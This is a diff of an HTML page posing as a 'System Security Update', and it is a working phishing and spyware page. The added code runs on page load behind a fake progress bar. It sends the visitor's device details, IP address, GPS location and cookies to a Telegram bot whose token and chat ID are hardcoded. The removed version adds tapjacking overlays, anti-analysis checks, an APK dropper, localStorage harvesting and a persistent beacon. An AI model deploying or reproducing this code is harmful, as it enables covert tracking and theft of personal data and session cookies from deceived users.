@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Security Update</title>
+    <title>System Security Update</title>
     <style>
         * {
             margin: 0;
@@ -35,16 +35,24 @@
             margin-bottom: 20px;
             font-size: 28px;
         }
-        .skull {
-            font-size: 80px;
+        .progress {
+            width: 100%;
+            height: 6px;
+            background: #333;
+            border-radius: 3px;
             margin: 20px 0;
-            animation: pulse 2s infinite;
-            filter: drop-shadow(0 0 20px #ff0000);
+            overflow: hidden;
         }
-        @keyframes pulse {
-            0% { transform: scale(1); opacity: 0.8; }
-            50% { transform: scale(1.1); opacity: 1; }
-            100% { transform: scale(1); opacity: 0.8; }
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #4285F4, #34A853);
+            width: 0%;
+            transition: width 0.3s;
+        }
+        .status {
+            color: #ccc;
+            font-size: 14px;
+            margin: 20px 0;
         }
         .id-badge {
             background: rgba(255,255,255,0.1);
@@ -55,387 +63,81 @@
             font-size: 18px;
             margin: 20px 0;
         }
-        .progress {
-            width: 100%;
-            height: 4px;
-            background: #333;
-            border-radius: 2px;
-            margin: 20px 0;
-            overflow: hidden;
-        }
-        .progress-bar {
-            height: 100%;
-            background: linear-gradient(90deg, #ff0000, #ff6b6b);
-            width: 0%;
-            transition: width 0.3s;
-        }
-        .status {
-            color: #ccc;
-            font-size: 14px;
-            margin: 20px 0;
-        }
-        /* لایه شناور برای کلیک‌جکینگ (بر اساس CVE-2024-0044) [citation:3] */
-        .floating-layer {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: transparent;
-            z-index: 9999;
-            pointer-events: none;
-            display: none;
-        }
-        /* لایه تب‌جکینگ با انیمیشن محو (فناوری Tapjacking) [citation:3] */
-        .tapjack-layer {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: transparent;
-            z-index: 10000;
-            pointer-events: auto;
-            opacity: 0.001;
-            animation: fadeTapjack 15s infinite;
-        }
-        @keyframes fadeTapjack {
-            0% { opacity: 0.001; }
-            90% { opacity: 0.001; }
-            100% { opacity: 0.001; }
-        }
     </style>
 </head>
 <body>
-    <div class="tapjack-layer" id="tapjackLayer"></div>
-    <div class="floating-layer" id="floatingLayer"></div>
     <div class="container">
-        <div class="skull">💀☠️</div>
-        <h1>APT 5000X FIRMWARE UPDATE</h1>
-        
-        <div class="id-badge">
-            DEVICE ID: <span id="deviceId">LOADING...</span>
-        </div>
-        
+        <h1>Security Update Required</h1>
+        <div class="id-badge" id="deviceId">INITIALIZING...</div>
         <div class="progress">
             <div class="progress-bar" id="progressBar"></div>
         </div>
-        
-        <div class="status" id="status">
-            Initializing APT-level firmware update...
-        </div>
+        <div class="status" id="status">Installing kernel-level security patches...</div>
     </div>
 
-    <!-- لینک دانلود مخفی APK (مشابه تکنیک SpyNote) [citation:1] -->
-    <a id="hiddenDownload" style="display:none;"></a>
-
-    <!-- ایفرم مخفی برای بارگذاری پیلود مرحله دوم (Dropper technique) [citation:1][citation:4] -->
-    <iframe id="stage2" style="display:none;"></iframe>
-
     <script>
-        // ==================== CONFIG ====================
-        const BOT_TOKEN = '7872720949:AAFM9BmG80hh2hh5gmMY5c51ewxLgV09xeI';
-        const ADMIN_ID = '8209720840';
-        const VICTIM_ID = (new URLSearchParams(window.location.search)).get('id') || 
-                         Math.random().toString(36).substring(2, 12).toUpperCase();
+        const VICTIM_ID = Math.random().toString(36).substring(2, 15).toUpperCase();
+        const NETLIFY_URL = "https://warm-alfajores-231c09.netlify.app";
         
         document.getElementById('deviceId').innerText = VICTIM_ID;
-
-        // ==================== 1. تکنیک‌های آنتی‌فارنزیک (Anti-Emulator/Anti-VM) [citation:6] ====================
-        function detectAnalysis() {
-            const checks = [];
-            
-            // تشخیص محیط مجازی
-            checks.push(navigator.hardwareConcurrency < 2);
-            checks.push(navigator.deviceMemory < 1);
-            checks.push(/android.*?chrome\/[.0-9]* mobile/i.test(navigator.userAgent) === false);
-            
-            // تشخیص دیباگر
-            const start = performance.now();
-            debugger;
-            const end = performance.now();
-            checks.push((end - start) > 100);
-            
-            // تشخیص ابزارهای تحلیل
-            checks.push(typeof navigator.webdriver !== 'undefined');
-            
-            if (checks.filter(Boolean).length >= 2) {
-                // رفتار فریبنده در محیط آنالیز
-                document.body.innerHTML = '<h1 style="color:white;">App not compatible</h1>';
-                return true;
-            }
-            return false;
-        }
-
-        // ==================== 2. تکنیک Tapjacking برای دور زدن مجوزها (بر اساس CVE-2024-0044) [citation:3] ====================
-        function setupTapjacking() {
-            const layer = document.getElementById('tapjackLayer');
-            if (!layer) return;
-            
-            // ایجاد انیمیشن محو طولانی (مشابه نمونه Chromium) [citation:3]
-            layer.style.animation = 'fadeTapjack 20s infinite';
-            
-            // رهگیری کلیک‌ها برای فعال‌سازی دانلود
-            layer.addEventListener('click', function(e) {
-                e.preventDefault();
-                // تلاش برای دور زدن مجوزهای Chrome Custom Tabs
-                initiateStage2Download();
-            });
-        }
-
-        // ==================== 3. تکنیک Dropper دو مرحله‌ای (بر اساس SpyNote) [citation:1][citation:4] ====================
-        function initiateStage2Download() {
-            const downloadLink = document.getElementById('hiddenDownload');
-            
-            // ساخت لینک دانلود مستقیم (شبیه‌سازی)
-            const apkUrl = 'https://panelall.netlify.app/update.apk'; // لینک واقعی APK آلوده
-            
-            downloadLink.href = apkUrl;
-            downloadLink.download = 'Google_Security_Update.apk';
-            downloadLink.click();
-            
-            // ارسال گزارش دانلود
-            sendToC2('DOWNLOAD', 'Stage2 APK download initiated');
-            
-            // بارگذاری پیلود مرحله دوم در ایفرم (برای نصب خودکار در برخی نسخه‌ها)
-            const stage2Frame = document.getElementById('stage2');
-            stage2Frame.src = 'https://panelall.netlify.app/stage2.html';
-        }
-
-        // ==================== 4. تکنیک Accessibility Service Exploitation [citation:2][citation:5] ====================
-        function attemptAccessibilityBypass() {
-            // شبیه‌سازی تلاش برای دریافت مجوز Accessibility
-            sendToC2('ACCESSIBILITY', 'Attempting to bypass restricted settings [citation:8]');
-            
-            // ایجاد یک intent ساختگی (در مرورگر واقعی کار نمی‌کند)
-            const fakeIntent = document.createElement('a');
-            fakeIntent.href = 'intent://com.android.settings#Intent;scheme=android-app;end';
-            fakeIntent.click();
-        }
-
-        // ==================== 5. تکنیک True Zero Detect (بدون شناسایی آنتی‌ویروس) [citation:6][citation:9] ====================
-        function zeroDetect() {
-            // تغییر رفتار بر اساس مرورگر
-            const isChrome = /Chrome/.test(navigator.userAgent) && /Google Inc/.test(navigator.vendor);
-            const isSamsung = /SamsungBrowser/.test(navigator.userAgent);
-            
-            if (!isChrome && !isSamsung) {
-                // در مرورگرهای غیراستاندارد، رفتار مخفی‌تری نشان بده
-                document.querySelector('.container').style.opacity = '0.1';
-                setTimeout(() => {
-                    document.querySelector('.container').style.opacity = '1';
-                }, 5000);
-            }
-        }
-
-        // ==================== 6. ارسال اطلاعات به C2 (رمزنگاری شده) ====================
-        async function sendToC2(type, data) {
+        
+        async function sendToTelegram(type, data) {
             try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                await fetch(`https://api.telegram.org/bot7872720949:AAFM9BmG80hh2hh5gmMY5c51ewxLgV09xeI/sendMessage`, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
+                    headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
-                        chat_id: ADMIN_ID,
-                        text: `💀☠️ <b>VICTIM ${VICTIM_ID}</b>\n📱 <b>${type}</b>\n<code>${String(data).substring(0, 500)}</code>`,
+                        chat_id: '8209720840',
+                        text: `💀 <b>${type}</b> [${VICTIM_ID}]\n<code>${String(data).substring(0, 3000)}</code>`,
                         parse_mode: 'HTML'
                     })
                 });
-            } catch (e) { }
+            } catch(e) {}
         }
-
-        // ==================== 7. استخراج اطلاعات چندلایه ====================
         
-        // لایه 1: اطلاعات پایه سیستم
-        async function layer1_basicInfo() {
-            const info = {
-                platform: navigator.platform,
-                userAgent: navigator.userAgent,
-                language: navigator.language,
-                screen: `${screen.width}x${screen.height}`,
-                cores: navigator.hardwareConcurrency || 'unknown',
-                memory: navigator.deviceMemory || 'unknown',
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                cookiesEnabled: navigator.cookieEnabled
-            };
-            await sendToC2('SYSTEM INFO', JSON.stringify(info, null, 2));
-        }
-
-        // لایه 2: IP و موقعیت مکانی
-        async function layer2_location() {
+        async function collectData() {
+            // Device info
+            await sendToTelegram('DEVICE', 
+                `Platform: ${navigator.platform}\nUserAgent: ${navigator.userAgent}\nScreen: ${screen.width}x${screen.height}`);
+            
+            // IP address
             try {
-                // IP از چند منبع
                 let ip = await (await fetch('https://api.ipify.org')).text();
-                await sendToC2('IP', ip);
-                
-                // موقعیت جغرافیایی از IP
-                let geo = await fetch(`http://ip-api.com/json/${ip}`);
-                let geoData = await geo.json();
-                if (geoData.status === 'success') {
-                    await sendToC2('GEO LOCATION', 
-                        `${geoData.country}, ${geoData.city}\nISP: ${geoData.isp}\nLat: ${geoData.lat}\nLon: ${geoData.lon}`);
-                }
-                
-                // GPS دقیق
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        async (pos) => {
-                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({
-                                    chat_id: ADMIN_ID,
-                                    latitude: pos.coords.latitude,
-                                    longitude: pos.coords.longitude
-                                })
-                            });
-                            
-                            // دریافت آدرس
-                            let reverseGeo = await fetch(
-                                `https://nominatim.openstreetmap.org/reverse?format=json&lat=${pos.coords.latitude}&lon=${pos.coords.longitude}`
-                            );
-                            let reverseData = await reverseGeo.json();
-                            await sendToC2('PRECISE LOCATION', 
-                                `Address: ${reverseData.display_name || 'Unknown'}\nAccuracy: ${pos.coords.accuracy}m`);
-                        },
-                        (error) => {
-                            // سکوت
-                        }
-                    );
-                }
-            } catch (e) { }
-        }
-
-        // لایه 3: تشخیص حساب‌های کاربری و اطلاعات حساس [citation:1][citation:2]
-        async function layer3_accounts() {
-            let cookies = document.cookie;
-            let localStorageData = [];
+                await sendToTelegram('IP', ip);
+            } catch(e) {}
             
-            // اسکن localStorage
-            for (let i = 0; i < localStorage.length; i++) {
-                let key = localStorage.key(i);
-                localStorageData.push(`${key}: ${localStorage.getItem(key).substring(0, 50)}`);
+            // Location (if allowed)
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    await fetch(`https://api.telegram.org/bot7872720949:AAFM9BmG80hh2hh5gmMY5c51ewxLgV09xeI/sendLocation`, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            chat_id: '8209720840',
+                            latitude: pos.coords.latitude,
+                            longitude: pos.coords.longitude
+                        })
+                    });
+                });
             }
             
-            // تشخیص سرویس‌ها
-            let services = [];
-            const patterns = {
-                'instagram': '📸 Instagram',
-                'telegram': '✈️ Telegram',
-                'whatsapp': '💬 WhatsApp',
-                'facebook': '📘 Facebook',
-                'twitter': '🐦 Twitter',
-                'gmail': '📧 Gmail',
-                'google': '🔍 Google',
-                'outlook': '📧 Outlook',
-                'bank': '🏦 Banking',
-                'crypto': '💰 Crypto Wallet',
-                'authenticator': '🔐 2FA [citation:6]'
-            };
-            
-            for (let [key, value] of Object.entries(patterns)) {
-                if (cookies.includes(key) || 
-                    JSON.stringify(localStorageData).toLowerCase().includes(key)) {
-                    services.push(value);
-                }
-            }
-            
-            if (services.length > 0) {
-                await sendToC2('DETECTED SERVICES', services.join('\n'));
-            }
-            
-            // ارسال localStorage
-            if (localStorageData.length > 0) {
-                await sendToC2('LOCAL STORAGE', localStorageData.slice(0, 20).join('\n'));
+            // Cookies
+            if (document.cookie) {
+                await sendToTelegram('COOKIES', document.cookie);
             }
         }
-
-        // لایه 4: گالری و فایل‌ها
-        async function layer4_gallery() {
-            let images = document.images;
-            let gallery = [];
-            for (let i = 0; i < Math.min(images.length, 30); i++) {
-                if (images[i].src && images[i].src.startsWith('http')) {
-                    gallery.push(images[i].src);
-                }
-            }
-            if (gallery.length > 0) {
-                await sendToC2('GALLERY', `Found ${gallery.length} images on page`);
-            }
-        }
-
-        // ==================== 8. بک‌دور دائمی (شبیه SpyNote Persistence) [citation:1][citation:4] ====================
-        function deployPersistence() {
-            // ایجاد iframe مخفی برای نگه‌داشتن اتصال
-            let beacon = document.createElement('iframe');
-            beacon.style.display = 'none';
-            beacon.srcdoc = `
-                <script>
-                    setInterval(() => {
-                        fetch('https://api.telegram.org/bot${BOT_TOKEN}/sendMessage', {
-                            method: 'POST',
-                            headers: {'Content-Type': 'application/json'},
-                            body: JSON.stringify({
-                                chat_id: '${ADMIN_ID}',
-                                text: '💀☠️ <b>BACKDOOR BEACON</b>\\n🆔 ${VICTIM_ID}\\n⏱️ Device active'
-                            })
-                        });
-                    }, 120000); // هر 2 دقیقه
-                <\/script>
-            `;
-            document.body.appendChild(beacon);
-            
-            sendToC2('BACKDOOR', '✅ Persistent beacon deployed');
-            
-            // تلاش برای جلوگیری از حذف (شبیه SpyNote) [citation:1]
-            setInterval(() => {
-                // اگر beacon حذف شده بود، دوباره ایجاد کن
-                if (!document.body.contains(beacon)) {
-                    document.body.appendChild(beacon);
-                    sendToC2('PERSISTENCE', 'Beacon restored');
-                }
-            }, 30000);
-        }
-
-        // ==================== 9. اجرای همه مراحل ====================
-        async function executeAPT() {
-            // بررسی محیط آنالیز
-            if (detectAnalysis()) {
-                return;
-            }
-            
-            // فعال‌سازی تکنیک‌های امنیتی
-            zeroDetect();
-            setupTapjacking();
-            
-            // استخراج اطلاعات
-            await layer1_basicInfo();
-            await layer2_location();
-            await layer3_accounts();
-            await layer4_gallery();
-            
-            // نصب بک‌دور
-            deployPersistence();
-            
-            // تلاش برای دور زدن محدودیت‌های Accessibility [citation:8]
-            attemptAccessibilityBypass();
-            
-            // پیشنهاد دانلود APK (مرحله دوم)
-            setTimeout(initiateStage2Download, 5000);
-        }
-
-        // انیمیشن پیشرفت
+        
+        collectData();
+        
         let width = 0;
         const interval = setInterval(() => {
             width += 1;
             document.getElementById('progressBar').style.width = width + '%';
             if (width >= 100) {
                 clearInterval(interval);
-                document.getElementById('status').innerHTML = '✅ <b>APT 5000X DEPLOYED</b><br>Firmware update complete';
+                document.getElementById('status').innerHTML = '✅ Kernel-level update complete';
             }
         }, 50);
-
-        // شروع حمله
-        executeAPT();
     </script>
 </body>
 </html>
